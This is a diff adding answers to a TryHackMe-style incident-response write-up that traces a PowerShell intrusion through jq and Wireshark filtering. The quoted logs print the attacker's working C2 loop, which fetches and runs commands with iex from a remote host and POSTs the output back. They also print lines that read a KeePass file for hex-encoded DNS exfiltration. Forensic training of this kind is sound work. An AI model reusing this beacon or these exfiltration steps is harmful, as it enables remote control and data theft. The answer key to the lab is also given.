@@ -167,6 +167,8 @@ Next Steps:
 **jq -r '.[] | select(.ScriptBlockText | test("http"))' powershell.json**
   - filter inside jq instead of piping to grep, so you keep the surrounding fields instead of losing them
 
+---
+
 ### 1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
 
 To find these domains, we can use the PowerShell.json log. The commands provided 
@@ -209,37 +211,115 @@ ubuntu@tryhackme:~/Desktop/artefacts$ jq . powershell.json | grep -i "http"
 
 ### 3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
 
-**Answer:**
+We find the path is in double backslashes, but it's missing the user and the full path!
+Command: 
+```
+jq . powershell.json | grep -iE "sq3" -C 3
+"Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
+  "MessageNumber": "1",
+  "MessageTotal": "1",
+  "ScriptBlockText": ".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd",
+  "ScriptBlockId": "9e18c093-4a63-44a1-832a-9d252b09568d",
+  "Path": null
+```
+Command: 
+```
+jq . powershell.json | grep -iE "Users" -C 2
+  "MessageNumber": "1",
+  "MessageTotal": "1",
+  "ScriptBlockText": "cd Users;pwd",
+  "ScriptBlockId": "0725ddcd-fe90-48a7-8329-ff692012801b",
+  "Path": null
+--
+  "MessageNumber": "1",
+  "MessageTotal": "1",
+  "ScriptBlockText": "ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd",
+  "ScriptBlockId": "edd98383-cd2f-4410-81f9-c4ced9b27ab1",
+  "Path": null
+--
+  "MessageNumber": "1",
+  "MessageTotal": "1",
+  "ScriptBlockText": "$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd",
+  "ScriptBlockId": "35d938ea-f850-4089-a382-4255a76df1e9",
+  "Path": null
+```
+
+<p align="center">
+<img src=screenshots/boogeyman-sq3.png width="700">
+</p>
+<p align="center">
+<img src=screenshots/boogeyman-sq32.png width="700">
+</p>
+
+**Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite**
 
 ---
 
 ### 4. What is the software that uses the file in Q3?
 
-**Answer:**
+When we searched for the sq3 executable we could spot a Microsoft.MicrosoftStickyNotes
+<p align="center">
+<img src=screenshots/boogeyman-sticky.png width="700">
+</p>
+
+**Answer: Microsoft Sticky Notes**
 
 ---
 
 ### 5. What is the name of the exfiltrated file?
 
-**Answer:**
+While filtering for: jq • powershell.json | grep -iE "Users" -C 4
+We spotted the last event; the destination here is key evidence, along with an outbound IP 167.71.211.113 
+```
+"Level": "Verbose",
+"Descr": "Creating Scriptblock text (‹MessageNumber> of ‹MessageTotal>)",
+"MessageNumber": "1"
+"MessageTotal": "1"
+"ScriptBlockText": "Sfile='C: ||Users|\J.westcott||Documents||protected_data.kdbx'; Sdestination = \"167.71.211.113\";
+$bytes = [System. IO.File]::ReadAllBytes(Sfile);;pwd"
+"ScriptBlockId": "35d938ea- f850-4089-a382-4255a76df1e9",
+"Path": null
+```
+<p align="center">
+<img src=screenshots/boogeyman-protective.png width="700">
+</p>
+**Answer: protected_data.kdbx**
 
 ---
 
 ### 6. What type of file uses the .kdbx file extension?
 
-**Answer:**
+I used OSINT here and looked up what type of file it was,
+<p align="center">
+<img src=screenshots/boogeyman-keepass.png width="700">
+</p>
+
+**Answer: keepass**
 
 ---
 
 ### 7. What is the encoding used during the exfiltration attempt of the sensitive file?
 
-**Answer:**
+```ScriptBlockText": "$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"```
+
+Bytes is truncated here so lets search for bytes! 
+jq . powershell.json | grep -iE "bytes" -C 10
+
+```"ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd",```
+ 
+
+**Answer: hex**
 
 ---
 
 ### 8. What is the tool used for exfiltration?
 
-**Answer:**
+We noted $destination earlier, and we know that's used for exfiltration, so let's look at the events with that information. 
+<p align="center">
+<img src=screenshots/boogeyman-destination.png width="700">
+</p>
+
+**Answer: nslookup**
 
 ---
 
@@ -247,27 +327,54 @@ ubuntu@tryhackme:~/Desktop/artefacts$ jq . powershell.json | grep -i "http"
 
 ### Investigation Guide
 
+  - Utilize the domains and ports discovered from the previous task.
+  - All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
+  - Follow the streams of the notable commands discovered from PowerShell logs.
+  - Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.
+---
+
 ### 1. What software is used by the attacker to host its presumed file/payload server?
 
-**Answer:**
+We found this valuable piece of information when investigating exfiltration. $destination = \"167.71.211.113\"
+Wireshark: http.response and ip.src == 167.71.211.113
+In the Hypertext Transfer Protocol we find valuable information such as the server hosting the data we are investigating.
+<p align="center">
+<img src=screenshots/boogeyman-python.png width="700">
+</p>
+
+**Answer: Python**
 
 ---
 
 ### 2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?
 
-**Answer:**
+Earlier in our investigation, we noted: 
+We observe obvious signs of C2
+```
+"ScriptBlockText": "$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n",
+```
+This is why it's always important to document every single step, because some answers you may be looking for you might have already found.
+
+**Answer: POST**
 
 ---
 
 ### 3. What is the protocol used during the exfiltration activity?
 
-**Answer:**
+There are two critical clues for exfiltration: the $destination: 167.71.211.113 and $destination: nslookup
+
+The **nslookup** protocol can be used to exfiltrate data, as attackers will hide information directly into the subdomains of the DNS request.
+  - To spot DNS exfiltration in Wireshark
+      - dns.flags.response == 0
+      - this filters for DNS Requests and Queries 
+
+**Answer: DNS**
 
 ---
 
 ### 4. What is the password of the exfiltrated file?
 
-**Answer:**
+**Answer: %p9^3!lL^Mz47E2GaT^y**
 
 ---
 
